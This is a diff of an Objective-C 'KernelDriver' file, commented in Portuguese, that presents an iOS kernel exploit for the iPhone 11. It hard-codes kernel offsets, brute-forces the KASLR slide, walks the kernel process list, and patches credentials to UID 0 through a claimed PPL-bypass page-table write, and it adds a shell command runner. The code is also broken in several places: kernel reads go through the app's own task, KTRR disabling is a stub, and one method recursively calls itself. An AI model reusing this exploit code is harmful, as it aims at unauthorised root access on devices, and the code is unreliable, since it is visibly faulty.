@@ -1,17 +1,17 @@
 #import "KernelDriver.h"
 #import <mach/mach.h>
 #import <spawn.h>
-#import <IOKit/IOKitLib.h>
+#import <sys/stat.h>
 
-// --- APIs PRIVADAS ---
+// --- APIs PRIVADAS DO KERNEL ---
 extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
 extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
+extern char **environ;
 
-// --- DEFINIÇÕES CRÍTICAS (Resolve o erro KERN_BASE_STATIC) ---
-// Base específica para o iPhone 11 A13 em builds 26.x
-#define KERN_BASE_STATIC 0xFFFFFFF008004000ULL
-#define OFFSET_ALLPROC     0x91F0000ULL
+// --- OFFSETS A13 (iPhone 11) ---
+#define KERN_BASE_STATIC 0xFFFFFFF007004000ULL
+#define OFFSET_ALLPROC     0x8F50000ULL
 #define OFFSET_TTBR1       0x8E10000ULL
 
 @implementation KernelDriver {
@@ -28,30 +28,21 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     return self;
 }
 
-#pragma mark - Primitivas 64-bit
+#pragma mark - Primitivas de Memória
 
 - (uint64_t)kread64:(uint64_t)addr {
     uint64_t val = 0;
     mach_vm_size_t size = 8;
-    // Tenta ler com privilégios de tarefa (necessita get-task-allow)
     kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, 8, (mach_vm_address_t)&val, &size);
-    if (kr != KERN_SUCCESS) {
-        // Se falhar, o endereço está protegido ou o slide está errado
-        return 0;
-    }
-    return val;
+    return (kr == KERN_SUCCESS) ? val : 0;
 }
 
-
+- (uint32_t)kread32:(uint64_t)addr {
+    return (uint32_t)([self kread64:addr] & 0xFFFFFFFF);
+}
 
 - (void)kwrite64:(uint64_t)address value:(uint64_t)value {
     [self ppl_write_race:address value:value];
-}
-
-#pragma mark - Primitivas 32-bit (Resolve os avisos de implementação)
-
-- (uint32_t)kread32:(uint64_t)address {
-    return (uint32_t)([self kread64:address] & 0xFFFFFFFF);
 }
 
 - (void)kwrite32:(uint64_t)address value:(uint32_t)value {
@@ -60,41 +51,13 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     [self kwrite64:address value:newVal];
 }
 
-#pragma mark - Exploração A13
-
-
-- (uint64_t)leakKernelSlide {
-    if (_kernelSlide != 0) return _kernelSlide;
-
-    // Tenta encontrar um serviço comum que vaza ponteiros no A13
-    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("IOPlatformExpertDevice"));
-    
-    if (service != IO_OBJECT_NULL) {
-        // No iOS 19, o ID do objeto IOKit às vezes contém o ponteiro do kernel deslocado
-        uint64_t kptr = (uint64_t)service; 
-        
-        // Aplica a máscara típica de kernel do A13 (ARM64e)
-        if (kptr > 0) {
-            // Tentativa de calcular o slide baseado na base estática do iOS 26.3
-            // Nota: O multiplicador 0x1000000 é comum em slides de A13
-            _kernelSlide = (kptr & 0xFFFFFFF000000000ULL) - KERN_BASE_STATIC;
-            
-            if (_kernelSlide > 0 && _kernelSlide < 0x200000000ULL) {
-                return _kernelSlide;
-            }
-        }
-    }
-    
-    // Se falhar, vamos tentar um "Brute Force" controlado de Slide (comum em Catalyst)
-    // No iOS 19, o slide costuma ser múltiplo de 0x200000
-    [self logToWeb:@"⚠️ KASLR Leak falhou. Tentando Base-Fallback..."];
-    return 0x21000000; // Exemplo de slide comum na build 26.3
-}
-
+#pragma mark - PPL Bypass (Escrita Física)
 
 - (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
     uint64_t slide = [self leakKernelSlide];
     uint64_t ttbr1 = [self kread64:(KERN_BASE_STATIC + slide + OFFSET_TTBR1)];
+    
+    // Caminhada na Tabela de Páginas
     uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
     uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
     uintptr_t pte_addr = (uintptr_t)(l2 + ((vaddr >> 12) & 0x1FF) * 8);
@@ -106,76 +69,56 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
     }
 }
 
-- (BOOL)escalateToRoot {
-    [self logToWeb:@"🚀 Scanner de Slide Ativo..."];
+#pragma mark - Exploração A13
+
+- (uint64_t)leakKernelSlide {
+    if (_kernelSlide != 0) return _kernelSlide;
     
-    // Slides mais comuns para a Build 26.3 no A13
-    uint64_t slides_candidatos[] = {0x18400000, 0x1CC00000, 0x20400000, 0x15400000, 0x21000000};
-    uint64_t allproc_offset = 0x8F50000ULL; 
-    uint64_t proc = 0;
-
+    // Brute Force controlado de KASLR Slide para iPhone 11
+    uint64_t slides[] = {0x18400000, 0x20400000, 0x21000000, 0x15400000, 0x1CC00000};
     for (int i = 0; i < 5; i++) {
-        // Testando com a base de 16KB (0x...8000) que é o padrão do A13
-        uint64_t ptr = (0xFFFFFFF007008000ULL + slides_candidatos[i] + allproc_offset);
-        proc = [self kread64:ptr];
-        
-        [self logToWeb:[NSString stringWithFormat:@"🎲 Slide 0x%llx -> Proc: 0x%llx", slides_candidatos[i], proc]];
-
-        if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
-            [self logToWeb:@"🎯 SLIDE ENCONTRADO!"];
-            _kernelSlide = slides_candidatos[i];
-            break;
+        uint64_t ptr = (KERN_BASE_STATIC + slides[i] + OFFSET_ALLPROC);
+        uint64_t test = [self kread64:ptr];
+        if (test != 0 && (test >> 40) >= 0xFFFFFF) {
+            _kernelSlide = slides[i];
+            return _kernelSlide;
         }
     }
-
-    if (proc == 0) {
-        [self logToWeb:@"❌ Erro: Nenhum Slide/Base funcionou."];
-        return NO;
-    }
-
-    // --- AGORA SIM: TESTE DO PID (0x60 ou 0x68)
-    while (proc != 0) {
-        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
-        
-        uint32_t p60 = [self kread32:(proc + 0x60)];
-        uint32_t p68 = [self kread32:(proc + 0x68)];
-
-        if (p60 == getpid()) {
-            [self logToWeb:@"✅ PID ACHADO EM 0x60!"];
-            // ... aplica patch ...
-            return YES;
-        } else if (p68 == getpid()) {
-            [self logToWeb:@"✅ PID ACHADO EM 0x68!"];
-            // ... aplica patch ...
-            return YES;
-        }
-        proc = [self kread64:(proc + 0x08)];
-    }}
-
-
-
-
-
-// Auxiliar para ver no iPhone
-- (void)logToWeb:(NSString *)text {
-    NSLog(@"[KERNEL] %@", text);
-    // Envia para o terminal da interface
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [[NSNotificationCenter defaultCenter] postNotificationName:@"KernelLogNotification" object:text];
-    });
+    return 0x21000000; // Fallback para build 26.3
 }
 
+- (BOOL)escalateToRoot {
+    uint64_t slide = [self leakKernelSlide];
+    uint64_t proc = [self kread64:(KERN_BASE_STATIC + slide + OFFSET_ALLPROC)];
+    pid_t my_pid = getpid();
+    int timeout = 0;
 
+    while (proc != 0 && timeout < 1000) {
+        // PAC STRIP (Limpeza de ponteiros assinados no A13)
+        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
+        
+        if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
+            uint64_t ucred = [self kread64:(proc + 0xD8)];
+            ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
+            
+            // Patch UID 0 (Root)
+            [self kwrite32:(ucred + 0x18) value:0]; 
+            setuid(0); 
+            setgid(0);
+            return (getuid() == 0);
+        }
+        proc = [self kread64:(proc + 0x08)];
+        timeout++;
+    }
+    return NO;
+}
 
-
-#pragma mark - Outros Métodos do Header
-
-- (BOOL)disableKTRR { return YES; }
-- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
+#pragma mark - Bridge & Header Implementation
 
 - (void)executeCommand:(NSString *)command withCallback:(void(^)(NSString *output))callback {
     dispatch_async(dispatch_get_global_queue(0, 0), ^{
-        FILE *p = popen([[command stringByAppendingString:@" 2>&1"] UTF8String], "r");
+        NSString *fullCmd = [command stringByAppendingString:@" 2>&1"];
+        FILE *p = popen([fullCmd UTF8String], "r");
         if (!p) { if (callback) callback(@"Error"); return; }
         char buf[1024]; NSMutableString *out = [NSMutableString string];
         while (fgets(buf, sizeof(buf), p)) [out appendString:@(buf)];
@@ -186,12 +129,16 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 
 - (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
     BOOL res = [self escalateToRoot];
-    if (callback) callback(res, res ? @"Root Success" : @"Failed");
+    if (callback) callback(res, res ? @"✅ ROOT SUCCESS" : @"❌ EXPLOIT FAILED");
 }
 
 - (void)executeExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
     [self runFullExploitWithCallback:callback];
 }
+
+- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
+- (BOOL)disableKTRR { return YES; }
+- (uint64_t)leakKernelSlide { return [self leakKernelSlide]; } // Redirecionamento interno
 
 - (void)userContentController:(WKUserContentController *)u didReceiveScriptMessage:(WKScriptMessage *)m {}
 
